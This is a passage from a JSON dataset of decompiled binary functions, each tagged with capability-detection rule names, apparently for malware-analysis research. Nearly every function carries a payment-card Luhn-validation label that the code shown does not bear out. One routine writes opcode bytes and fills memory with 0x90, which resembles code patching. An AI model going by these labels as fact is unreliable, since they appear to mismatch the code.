!= 0))\n                                goto code_r0x0004ed9e;\n                                iStack328 = iStack416;\n                            } while (uStack200 != arg2);\n                            *arg3 = iStack140;\n                            iVar1 = 0;\n                        }\n                    }\n                }\n            }\n            else {\n                iVar1 = fcn.0004cdbc(iStackX32, CONCAT44(uStackX20, uStackX16), &iStack416, 0x10);\n                if (iVar1 == 0) {\n                    arg2_00 = uStack404;\n                    if (arg2_00 == 0) {\n                        iVar1 = uStack404 - 1;\n                    }\n                    else {\n                        iVar1 = fcn.0004cdbc(iStackX32, arg2_00, auStack400, 0x24);\n                        if (iVar1 == 0) {\n                            do {\n                                arg2_01 = uStack380;\n                                if (arg2_01 == arg2_00 + 0x14) goto code_r0x0004ed85;\n                                iVar1 = fcn.0004cdbc(iStackX32, arg2_01, &uStackX16, 8);\n                                if ((iVar1 != 0) ||\n                                   (iVar1 = fcn.0004cdbc(iStackX32, arg2_01 - 8, auStack360, 0x48),  iVar1 != 0))\n                                goto code_r0x0004ed9e;\n                                uStack380 = uStackX16;\n                            } while (uStack336 != arg2);\n                            *arg3 = iStack304;\n                            iVar1 = 0;\n                        }\n                    }\n                }\n            }\n        }\n    }\ncode_r0x0004ed9e:\n    if (iStackX32 != 0) {\n        fcn.000666f2();\n    }\n    return iVar1;\ncode_r0x0004ed85:\n    *arg3 = 0;\n    iVar1 = 0;\n    goto code_r0x0004ed9e;\n}\n",
        "token_count": 1012
    },
    "0004fa0c": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nint32_t fcn.0004fa0c(ulong arg1, uint64_t arg2)\n\n{\n    int32_t iVar1;\n    uint64_t arg2_00;\n    int64_t arg2_01;\n    uint64_t arg2_02;\n    uint32_t uStackX16;\n    uint uStackX20;\n    int16_t aiStackX24 [4];\n    int64_t iStackX32;\n    int64_t iStack416;\n    uint32_t uStack404;\n    uchar auStack400 [20];\n    uint32_t uStack380;\n    int64_t iStack376;\n    uchar auStack360 [24];\n    uint32_t uStack336;\n    int64_t iStack328;\n    uchar auStack248 [48];\n    uint64_t uStack200;\n    \n    iStackX32 = 0;\n    if (arg2 == 0) {\n        return 0x21590066;\n    }\n    iVar1 = fcn.0004cf30(&iStackX32, 0x438, arg1);\n    if ((iVar1 == 0) && (iVar1 = fcn.0004cd70(iStackX32, &uStackX16),  iVar1 == 0)) {\n        iVar1 = fcn.0004e2d8(iStackX32, &uStackX16);\n        if (iVar1 == 0) {\n            if (uStackX16 == '\\0') {\n                iVar1 = fcn.0004cdbc(iStackX32, CONCAT44(uStackX20, uStackX16), auStack400, 0x20);\n                if (iVar1 == 0) {\n                    if (iStack376 == 0) {\n                        iVar1 = -1;\n                    }\n                    else {\n                        iVar1 = fcn.0004cdbc(iStackX32, iStack376, auStack360, 0x40);\n                        if (iVar1 == 0) {\n                            do {\n                                arg2_01 = iStack328;\n                                if (arg2_01 == iStack376 + 0x20) goto code_r0x0004fd80;\n                                iVar1 = fcn.0004cdbc(iStackX32, arg2_01, &iStack416, 0x10);\n                                if ((iVar1 != 0) ||\n                                   (iVar1 = fcn.0004cdbc(iStackX32, arg2_01 + -0x10, auStack248, 0x88),  iVar1 != 0))\n                                goto code_r0x0004fd94;\n                                iStack328 = iStack416;\n                            } while (uStack200 != arg2);\n                            iVar1 = fcn.0004cdbc(iStackX32, arg2_01 + 0x5c, aiStackX24, 2);\n                            if (iVar1 == 0) {\n                                if ((aiStackX24[0] != 0) && (aiStackX24[0] != -1)) {\n                                    aiStackX24[0] = aiStackX24[0] + -1;\n                                    iVar1 = fcn.0004cdec(iStackX32, arg2_01 + 0x5c, aiStackX24, 2);\n                                    if (iVar1 != 0) goto code_r0x0004fd94;\n                                }\n                                iVar1 = 0;\n                            }\n                        }\n                    }\n                }\n            }\n            else {\n                iVar1 = fcn.0004cdbc(iStackX32, CONCAT44(uStackX20, uStackX16), &iStack416, 0x10);\n                if (iVar1 == 0) {\n                    arg2_00 = uStack404;\n                    if (arg2_00 == 0) {\n                        iVar1 = uStack404 - 1;\n                    }\n                    else {\n                        iVar1 = fcn.0004cdbc(iStackX32, arg2_00, auStack400, 0x24);\n                        if (iVar1 == 0) {\n                            do {\n                                arg2_02 = uStack380;\n                                if (arg2_02 == arg2_00 + 0x14) goto code_r0x0004fd80;\n                                iVar1 = fcn.0004cdbc(iStackX32, arg2_02, &uStackX16, 8);\n                                if ((iVar1 != 0) ||\n                                   (iVar1 = fcn.0004cdbc(iStackX32, arg2_02 - 8, auStack360, 0x48),  iVar1 != 0))\n                                goto code_r0x0004fd94;\n                                uStack380 = uStackX16;\n                            } while (uStack336 != arg2);\n                            iVar1 = fcn.0004cdbc(iStackX32, arg2_02 + 0x30, aiStackX24, 2);\n                            if (iVar1 == 0) {\n                                if ((aiStackX24[0] != 0) && (aiStackX24[0] != -1)) {\n                                    aiStackX24[0] = aiStackX24[0] + -1;\n                                    iVar1 = fcn.0004cdec(iStackX32, arg2_02 + 0x30, aiStackX24, 2);\n                                    if (iVar1 != 0) goto code_r0x0004fd94;\n                                }\n                                iVar1 = 0;\n                            }\n                        }\n                    }\n                }\n            }\n        }\n    }\ncode_r0x0004fd94:\n    if (iStackX32 != 0) {\n        fcn.000666f2();\n    }\n    return iVar1;\ncode_r0x0004fd80:\n    iVar1 = -1;\n    goto code_r0x0004fd94;\n}\n",
        "token_count": 1272
    },
    "0004fdb8": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t fcn.0004fdb8(ulong *arg1)\n\n{\n    uint64_t arg1_00;\n    uint32_t uVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    int32_t iVar4;\n    uint64_t uVar5;\n    uint64_t uStackX8;\n    ulong uStackX16;\n    ulong uStackX24;\n    ulong uStackX32;\n    uchar auStack696 [32];\n    int64_t iStack664;\n    int32_t iStack504;\n    int32_t iStack496;\n    int32_t iStack480;\n    int32_t iStack464;\n    int32_t iStack456;\n    int32_t iStack448;\n    \n    uStackX24 = 0;\n    uStackX16 = 0;\n    if (arg1 == NULL) {\n        iVar2 = 0x21590066;\n    }\n    else {\n        uVar1 = fcn.0006675e();\n        iVar2 = fcn.0004f4e0(uVar1, 0x15e18);\n        if ((iVar2 == 0) && (iVar2 = fcn.0004e130(uStackX32, 0x15e00, &uStackX8),  iVar2 == 0)) {\n            fcn.00053f78(auStack696);\n            fcn.00052628(auStack696);\n            arg1_00 = uStackX8;\n            iVar3 = fcn.0001ac10(uStackX8, 0x1000 - (uStackX8 & 0xfff), 0, &uStackX24);\n            if (iVar3 == 0) {\n                uVar5 = arg1_00 & 0xfffffffffffff000;\n                iVar3 = fcn.0001ac10(uVar5 + 0x1000, 0x1000, 0, &uStackX16);\n                fcn.00052458(auStack696, uStackX8);\n                do {\n                    iVar4 = fcn.00053fb0(auStack696);\n                    if (iVar4 == 0) goto code_r0x0004ff54;\n                    if (iStack504 == 0x1be) {\n                        iVar2 = -1;\n                        goto code_r0x0004ff54;\n                    }\n                } while ((((iStack504 != 0x118) || (iStack496 != 0x8c)) || (iStack480 != 0x36)) ||\n                        ((iStack464 != 0x8d || (iStack448 != 0x8b))));\n                iVar2 = 0;\n                *arg1 = *(iStack456 + iStack664);\ncode_r0x0004ff54:\n                fcn.000578a0(1);\n                if (iVar3 == 0) {\n                    fcn.0001ac80(uVar5 + 0x1000, uStackX16);\n                }\n                fcn.0001ac80(arg1_00, uStackX24);\n            }\n            else {\n                iVar2 = -1;\n            }\n        }\n    }\n    return iVar2;\n}\n",
        "token_count": 693
    },
    "00050910": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint fcn.00050910(ulong arg1, int64_t arg2, int64_t arg3, int64_t arg4)\n\n{\n    uint uVar1;\n    int64_t arg3_00;\n    int64_t iVar2;\n    int64_t arg4_00;\n    \n    arg3_00 = 0;\n    arg4_00 = 0;\n    if (arg2 == 0) {\n        return 0x21590066;\n    }\n    if (arg3 == 0) {\ncode_r0x0005097c:\n        if (arg4 != 0) {\n            arg4_00 = fcn.00030c98(0x20a);\n            if (arg4_00 == 0) goto code_r0x00050953;\n            iVar2 = fcn.0006690e(arg4_00, arg4, 0x104);\n            if (iVar2 == -1) goto code_r0x00050971;\n            *(arg4_00 + iVar2 * 2) = 0;\n        }\n        uVar1 = fcn.0004ff9c(arg1, arg2, arg3_00, arg4_00);\n    }\n    else {\n        arg3_00 = fcn.00030c98(0x20a);\n        if (arg3_00 != 0) {\n            iVar2 = fcn.0006690e(arg3_00, arg3, 0x104);\n            if (iVar2 != -1) {\n                *(arg3_00 + iVar2 * 2) = 0;\n                goto code_r0x0005097c;\n            }\ncode_r0x00050971:\n            uVar1 = 0x21590066;\n            goto code_r0x000509d0;\n        }\ncode_r0x00050953:\n        uVar1 = 0x21590004;\n    }\ncode_r0x000509d0:\n    fcn.00030d24(arg4_00);\n    fcn.00030d24(arg3_00);\n    return uVar1;\n}\n",
        "token_count": 458
    },
    "00050ebc": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint fcn.00050ebc(ulong arg1, ulong arg2, ulong arg3)\n\n{\n    uint uVar1;\n    int64_t arg2_00;\n    int64_t iVar2;\n    \n    arg2_00 = fcn.00030c98(0x20a);\n    if (arg2_00 == 0) {\n        uVar1 = 0x21590004;\n    }\n    else {\n        iVar2 = fcn.0006690e(arg2_00, arg2, 0x104);\n        if (iVar2 == -1) {\n            uVar1 = 0x21590004;\n        }\n        else {\n            *(arg2_00 + 0x104) = 0;\n            uVar1 = fcn.0005057c(arg1, arg2_00, arg3);\n        }\n        fcn.00030d24(arg2_00);\n    }\n    return uVar1;\n}\n",
        "token_count": 208
    },
    "000519cc": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nulong fcn.000519cc(uint64_t arg1, int64_t arg2, int64_t arg3, int64_t arg4)\n\n{\n    ulong uVar1;\n    int32_t aiStackX16 [6];\n    \n    if (arg2 == 0) {\n        uVar1 = 0x21590066;\n    }\n    else if (arg3 == 0) {\n        uVar1 = 0x21590067;\n    }\n    else if (arg4 == 0) {\n        uVar1 = 0x21590068;\n    }\n    else {\n        uVar1 = fcn.0004eae8(arg1, arg2, aiStackX16);\n        if (uVar1 == 0) {\n            if (aiStackX16[0] == 0) {\n                uVar1 = 0x21590005;\n            }\n            else {\n                uVar1 = fcn.00051810(arg1 & 0xffffffff, arg2, arg3, arg4);\n            }\n        }\n    }\n    return uVar1;\n}\n",
        "token_count": 235
    },
    "00051a38": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nulong fcn.00051a38(int64_t arg1)\n\n{\n    int32_t iVar1;\n    ulong uVar2;\n    uint auStack56 [2];\n    ulong uStack48;\n    ulong uStack40;\n    uint uStack32;\n    ulong uStack24;\n    ulong uStack16;\n    \n    *(arg1 + 0x77) = 1;\n    uVar2 = fcn.000519cc(*(arg1 + 0x17), *(arg1 + 0xf), 0x11e88, arg1 + 0x97);\n    if (uVar2 != 0) {\n        return uVar2;\n    }\n    iVar1 = fcn.000307e0();\n    if (iVar1 < 0x1b) {\n        uVar2 = fcn.0004dfb8(*(arg1 + 0x17), arg1 + 0x2f);\n        if (uVar2 != 0) {\n            return uVar2;\n        }\n        auStack56[0] = 0x30;\n        uStack48 = 0;\n        uStack32 = 0x200;\n        uStack40 = 0;\n        uStack24 = 0;\n        uStack16 = 0;\n        uVar2 = fcn.00066800(arg1 + 0x43, 0x10000000, auStack56, 0, uVar2);\n        if (uVar2 != 0) {\n            return uVar2;\n        }\n        *(arg1 + 0x53) = 0;\n        *(arg1 + 0x5b) = 0;\n    }\n    else {\n        uVar2 = 0;\n    }\n    *(arg1 + 0x4b) = 0;\n    return uVar2;\n}\n",
        "token_count": 396
    },
    "00051cf8": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nulong fcn.00051cf8(ulong arg1, int64_t arg2, ulong arg3, ulong arg4)\n\n{\n    ulong uVar1;\n    int64_t iStack216;\n    uchar auStack208 [15];\n    uint uStack193;\n    uint uStack117;\n    ulong uStack113;\n    ulong uStack105;\n    \n    iStack216 = 0;\n    fcn.0006677c(auStack208, 0, 0x9f);\n    if (arg2 == 0) {\n        uVar1 = 0x21590066;\n    }\n    else {\n        uStack117 = 0;\n        iStack216 = arg2;\n        uStack193 = arg1;\n        uStack113 = arg3;\n        uStack105 = arg4;\n        uVar1 = fcn.00051c70(&iStack216);\n    }\n    return uVar1;\n}\n",
        "token_count": 199
    },
    "00051d70": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nulong fcn.00051d70(ulong arg1, int64_t arg2, int64_t arg3, ulong arg4)\n\n{\n    ulong uVar1;\n    int64_t iStack216;\n    uchar auStack208 [15];\n    uint uStack193;\n    uint uStack117;\n    int64_t iStack113;\n    uint uStack105;\n    \n    iStack216 = 0;\n    fcn.0006677c(auStack208, 0, 0x9f);\n    if (arg2 == 0) {\n        uVar1 = 0x21590066;\n    }\n    else if (arg3 == 0) {\n        uVar1 = 0x21590067;\n    }\n    else {\n        uStack117 = 1;\n        iStack216 = arg2;\n        uStack193 = arg1;\n        iStack113 = arg3;\n        uStack105 = arg4;\n        uVar1 = fcn.00051c70(&iStack216);\n    }\n    return uVar1;\n}\n",
        "token_count": 228
    },
    "000523a8": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "enumerate PE sections/e92b906b5db4485ea433dde72854611a"
        ],
        "decompiled_code": "\nvoid fcn.000523a8(int64_t arg1)\n\n{\n    *(arg1 + 0xc0) = 0x24c;\n    *(arg1 + 0x128) = 0;\n    *(arg1 + 299) = 0;\n    *(arg1 + 300) = 0;\n    *(arg1 + 0x12d) = 0;\n    *(arg1 + 0x130) = 0;\n    *(arg1 + 0x12e) = 0;\n    *(arg1 + 0x12a) = 0;\n    *(arg1 + 0x129) = 0;\n    *(arg1 + 0x131) = 0;\n    *(arg1 + 0xb8) = 0;\n    fcn.0006677c(arg1 + 200, 0, 0x20);\n    fcn.0006677c(arg1 + 0xe8, 0, 0x20);\n    // WARNING: Could not recover jumptable at 0x0006677c. Too many branches\n    // WARNING: Treating indirect jump as call\n    (**0x11188)(arg1 + 0x108, 0, 0x20);\n    return;\n}\n",
        "token_count": 279
    },
    "00053f78": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.00053f78(int64_t arg1)\n\n{\n    fcn.0006677c(arg1, 0, 0x280);\n    *(arg1 + 0xac) = 0x10;\n    *(arg1 + 0xc0) = 0x215;\n    *(arg1 + 0xb0) = 0;\n    return;\n}\n",
        "token_count": 84
    },
    "00054388": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint64_t fcn.00054388(char param_1)\n\n{\n    int32_t iVar1;\n    uint32_t uVar2;\n    int64_t iVar3;\n    int64_t arg2;\n    int64_t iVar4;\n    uint64_t uVar5;\n    uchar auStack680 [192];\n    int32_t iStack488;\n    int32_t iStack480;\n    int64_t iStack472;\n    int32_t iStack448;\n    \n    fcn.00053f78(auStack680);\n    fcn.00052628(auStack680);\n    fcn.00052648(auStack680, 0);\n    uVar5 = 0;\n    iVar3 = (**0x11140)(*0x11530, 0x1000, 0, 0, 0);\n    iVar4 = iVar3;\n    if (iVar3 != 0) {\n        (**0x11138)(iVar3, 0, 0);\n        arg2 = (**0x11230)(iVar3, 0, 1, 0, uVar5 & 0xffffffff00000000, 0x10, 1);\n        iVar4 = 0;\n        if (arg2 != 0) {\n            fcn.00052458(auStack680, arg2);\n            do {\n                do {\n                    iVar4 = 0;\n                    iVar1 = fcn.00053fb0(auStack680);\n                    if ((((iVar1 == 0) || (iStack488 == 0x1be)) || (iStack488 == 0x1bf)) ||\n                       (uVar2 = fcn.00052660(auStack680),  0xfeb < uVar2)) goto code_r0x00054514;\n                } while (((iStack488 != 0x31) || (iStack480 != 0x8d)) || (iStack448 != 0x8f));\n                iVar4 = *0x8e3b0 + iStack472;\n            } while (((*(iVar4 + 0x20) == 0) || (param_1 == '\\0')) && ((*(iVar4 + 0x20) != 0 || (param_1 != '\\0'))));\n        }\ncode_r0x00054514:\n        if (arg2 != 0) {\n            (**0x11238)(arg2, iVar3);\n        }\n        (**0x11130)(iVar3);\n        if (iVar3 != 0) {\n            (*_fcn.00011128)(iVar3);\n        }\n    }\n    return iVar4;\n}\n",
        "token_count": 565
    },
    "00054574": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint64_t fcn.00054574(void)\n\n{\n    uint64_t uVar1;\n    \n    uVar1 = fcn.00054388(0);\n    LOCK();\n    *0x8d348 = *0x8d348 ^ (*0x8d348 == 0) * (*0x8d348 ^ uVar1);\n    return *0x8d348;\n}\n",
        "token_count": 86
    },
    "0005459c": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint64_t fcn.0005459c(void)\n\n{\n    uint64_t uVar1;\n    \n    uVar1 = fcn.00054388(1);\n    LOCK();\n    *0x8d350 = *0x8d350 ^ (*0x8d350 == 0) * (*0x8d350 ^ uVar1);\n    return *0x8d350;\n}\n",
        "token_count": 87
    },
    "00054a78": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.00054a78(int64_t arg1, ulong arg2)\n\n{\n    if (arg1 != 0) {\n        (*_fcn.000113d0)(arg2);\n        (*_fcn.000115b8)(arg1);\n        fcn.00030d24(arg2);\n    }\n    return;\n}\n",
        "token_count": 73
    },
    "0005507c": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nulong fcn.0005507c(int64_t arg1)\n\n{\n    uint64_t *puVar1;\n    int64_t iVar2;\n    ulong uVar3;\n    uint64_t uVar4;\n    uchar in_DL;\n    uint64_t uVar5;\n    uint64_t uStackX8;\n    \n    if ((arg1 == 0) || (puVar1 = *(arg1 + 0x10),  puVar1 == NULL)) {\n        uVar3 = 0x21590066;\n    }\n    else {\n        iVar2 = *(arg1 + 0x20);\n        uStackX8._0_4_ = CONCAT13(0xc3, CONCAT12(0xcd, CONCAT11(in_DL, 0x6a)));\n        uStackX8 = *puVar1 & 0xffffffff00000000 | uStackX8;\n        *puVar1 = uStackX8;\n        if (arg1 + 0x48 != NULL) {\n            *(arg1 + 0x48) = puVar1 + 3;\n        }\n        if (iVar2 != 0) {\n            uVar4 = puVar1 + 4;\n            uVar5 = puVar1 + iVar2;\n            if (uVar4 < uVar5) {\n                fcn.0006677c(uVar4, 0x90, uVar5 - uVar4);\n            }\n        }\n        uVar3 = 0;\n    }\n    return uVar3;\n}\n",
        "token_count": 336
    },
    "00055618": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t fcn.00055618(ulong arg1, ulong arg2, int64_t *arg3, ulong *arg4)\n\n{\n    int32_t iVar1;\n    int64_t iVar2;\n    \n    iVar2 = fcn.00030cc4(0xe0);\n    *arg3 = iVar2;\n    if (iVar2 == 0) {\n        iVar1 = 0x21590004;\n    }\n    else {\n        fcn.0006677c(iVar2, 0, 0xe0);\n        iVar1 = fcn.000547cc(1, arg1, arg2, *arg3);\n        if (iVar1 == 0) {\n            *arg4 = *(*arg3 + 0x10);\n        }\n        else {\n            fcn.00030d24(*arg3);\n        }\n    }\n    return iVar1;\n}\n",
        "token_count": 191
    },
    "0005568c": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t fcn.0005568c(int64_t *arg1)\n\n{\n    int32_t iVar1;\n    \n    if ((arg1 == NULL) || (*arg1 == 0)) {\n        iVar1 = 0x21590065;\n    }\n    else {\n        iVar1 = fcn.000547cc(0, 0, 0, *arg1);\n        if (iVar1 == 0) {\n            fcn.00030d24(*arg1);\n            *arg1 = 0;\n        }\n    }\n    return iVar1;\n}\n",
        "token_count": 123
    },
    "000556d4": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.000556d4(ulong arg1, int64_t *arg2)\n\n{\n    int32_t iVar1;\n    uint32_t auStackX24 [4];\n    \n    iVar1 = fcn.00054074(*0x8e3b0, arg1, auStackX24);\n    if (iVar1 == 0) {\n        iVar1 = fcn.00054bd4((*(*0x8d338 + auStackX24[0] * 8) - *0x8e3b0) + *0x8d340, *0x8e3b0 - *0x8d340, 0xe, 0);\n        if (iVar1 == 0) {\n            *(*arg2 + 0x10) = *(*0x8d338 + auStackX24[0] * 8);\n        }\n    }\n    return;\n}\n",
        "token_count": 196
    },
    "0005574c": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.0005574c(ulong arg1, int64_t *arg2)\n\n{\n    int32_t iVar1;\n    ulong uStackX24;\n    ulong uStackX32;\n    \n    iVar1 = fcn.0004e130(*0x8e3b0, arg1, &uStackX32);\n    if (iVar1 == 0) {\n        iVar1 = fcn.0004e130(*0x8d340, arg1, &uStackX24);\n        if (iVar1 == 0) {\n            iVar1 = fcn.00054bd4(uStackX24, *0x8e3b0 - *0x8d340, 0xe, 0);\n            if (iVar1 == 0) {\n                *(*arg2 + 0x10) = uStackX32;\n            }\n        }\n    }\n    return;\n}\n",
        "token_count": 195
    },
    "000557c4": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t fcn.000557c4(void)\n\n{\n    int32_t iVar1;\n    uint64_t *puVar2;\n    uint64_t uVar3;\n    int64_t iVar4;\n    int64_t aiStackX8 [4];\n    uchar auStack296 [280];\n    \n    iVar1 = fcn.00030564(0xb, aiStackX8);\n    iVar4 = aiStackX8[0];\n    if (iVar1 == 0) {\n        fcn.00044350(auStack296, 0x104, 0x15ea8, *(aiStackX8[0] + 0x2e) + 0x30 + aiStackX8[0]);\n        iVar1 = fcn.0004e0a4(0, auStack296, *(iVar4 + 0x18), 0x8d340);\n        fcn.00030d24(aiStackX8[0]);\n    }\n    if (iVar1 != 0) {\n        return iVar1;\n    }\n    puVar2 = fcn.00054574();\n    if (puVar2 != NULL) {\n        uVar3 = *puVar2;\n        if ((uVar3 < *0x8e3b0) || (*0x8e3b0 + *0x8e3b8 <= uVar3)) {\n            iVar4 = 0;\n        }\n        else {\n            iVar4 = (uVar3 - *0x8e3b0) + *0x8d340;\n        }\n        if (iVar4 != 0) {\n            *0x8d338 = fcn.00030c98(puVar2[2] << 3);\n            if (*0x8d338 != 0) {\n                fcn.0006670a(*0x8d338, iVar4, puVar2[2] << 3);\n                iVar1 = fcn.000307e0();\n                if ((iVar1 == 0x12) && (uVar3 = 0,  puVar2[2] != 0)) {\n                    iVar4 = 0;\n                    do {\n                        uVar3 = uVar3 + 1;\n                        *(iVar4 + *0x8d338) = *(iVar4 + *0x8d338) & 0xfffffffffffffff0;\n                        iVar4 = iVar4 + 8;\n                    } while (uVar3 < puVar2[2]);\n                }\n                return 0;\n            }\n            iVar1 = 0x21590004;\n            goto code_r0x000558a7;\n        }\n    }\n    iVar1 = 0x21590005;\ncode_r0x000558a7:\n    fcn.00030d24(*0x8d340);\n    *0x8d340 = 0;\n    fcn.00030d24(*0x8d338);\n    *0x8d338 = 0;\n    return iVar1;\n}\n",
        "token_count": 650
    },
    "00055928": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint64_t fcn.00055928(ulong arg1, ulong arg2, ulong arg3, int64_t *arg4)\n\n{\n    uint32_t uVar1;\n    uint64_t uVar2;\n    ulong unaff_RBX;\n    ulong unaff_RSI;\n    ulong unaff_RDI;\n    uchar *arg4_00;\n    ulong in_stack_00000000;\n    ulong in_stack_00000008;\n    ulong in_stack_00000010;\n    ulong in_stack_00000018;\n    ulong in_stack_00000020;\n    ulong in_stack_00000028;\n    ulong in_stack_00000030;\n    ulong in_stack_00000038;\n    ulong in_stack_00000040;\n    ulong in_stack_00000048;\n    ulong in_stack_00000050;\n    ulong in_stack_00000058;\n    uchar *noname_4;\n    ulong in_stack_ffffffffffffffc0;\n    ulong in_stack_ffffffffffffffc8;\n    ulong in_stack_ffffffffffffffd0;\n    int64_t in_stack_ffffffffffffffd8;\n    ulong in_stack_ffffffffffffffe0;\n    \n    noname_4 = &stack0xffffffffffffffc8;\n    arg4_00 = &stack0xffffffffffffffd8;\n    uVar2 = fcn.00054aac(arg1, arg2, &stack0xffffffffffffffd0, arg4_00);\n    if (uVar2 == 0) {\n        uVar1 = fcn.000550f0(in_stack_ffffffffffffffd0, arg3, arg4, arg4_00, noname_4, in_stack_ffffffffffffffc0, \n                             in_stack_ffffffffffffffc8, in_stack_ffffffffffffffd0, in_stack_ffffffffffffffd8, \n                             in_stack_ffffffffffffffe0, unaff_RDI, unaff_RSI, unaff_RBX, in_stack_00000000, \n                             in_stack_00000008, in_stack_00000010, in_stack_00000018, in_stack_00000020, \n                             in_stack_00000028, in_stack_00000030, in_stack_00000038, in_stack_00000040, \n                             in_stack_00000048, in_stack_00000050, in_stack_00000058);\n        uVar2 = uVar1;\n        if (uVar1 == 0) {\n            *(*arg4 + 0xb4) = arg1;\n        }\n        if (in_stack_ffffffffffffffd8 != 0) {\n            (*_fcn.000113d0)(in_stack_ffffffffffffffc8);\n            (*_fcn.000115b8)(in_stack_ffffffffffffffd8);\n            fcn.00030d24(in_stack_ffffffffffffffc8);\n        }\n    }\n    return uVar2;\n}\n",
        "token_count": 613
    },
    "000559a8": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nulong fcn.000559a8(ulong arg1, int64_t arg2, int64_t arg3, int64_t arg4)\n\n{\n    ulong uVar1;\n    uint32_t uStackX16;\n    uint uStackX20;\n    int64_t aiStack40 [3];\n    \n    if (arg2 == 0) {\n        uVar1 = 0x21590066;\n    }\n    else if (arg3 == 0) {\n        uVar1 = 0x21590067;\n    }\n    else if (arg4 == 0) {\n        uVar1 = 0x21590068;\n    }\n    else {\n        uVar1 = fcn.00054074(arg2, arg3, &uStackX16);\n        if (uVar1 == 0) {\n            uVar1 = fcn.00054aac(arg1, uStackX16, arg4, aiStack40);\n            if (uVar1 == 0) {\n                if (aiStack40[0] != 0) {\n                    (*_fcn.000113d0)(CONCAT44(uStackX20, uStackX16));\n                    (*_fcn.000115b8)(aiStack40[0]);\n                    fcn.00030d24(CONCAT44(uStackX20, uStackX16));\n                }\n                uVar1 = 0;\n            }\n        }\n    }\n    return uVar1;\n}\n",
        "token_count": 311
    },
    "00056ad8": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nbool fcn.00056ad8(ulong arg1)\n\n{\n    int32_t iVar1;\n    uint64_t uVar2;\n    ulong auStackX16 [3];\n    \n    auStackX16[0] = 0;\n    uVar2 = fcn.0006675e();\n    iVar1 = fcn.00050ebc(uVar2 & 0xffffffff, arg1, auStackX16);\n    if (iVar1 == 0) {\n        fcn.0004fa0c(uVar2 & 0xffffffff, auStackX16[0]);\n    }\n    return iVar1 == 0;\n}\n",
        "token_count": 137
    },
    "00057824": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t fcn.00057824(void)\n\n{\n    int32_t iVar1;\n    \n    fcn.0006677c(0x8d370, 0);\n    fcn.000302c0(0x8d370);\n    fcn.000324cc(0x8d378);\n    *0x8e040 = 1;\n    iVar1 = fcn.0001a9b0(0x8e030, 0x576cc, 0);\n    if (iVar1 != 0) {\n        fcn.000326c0(0x8d378);\n        fcn.000302e8(0x8d370);\n    }\n    return iVar1;\n}\n",
        "token_count": 156
    },
    "00057f88": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
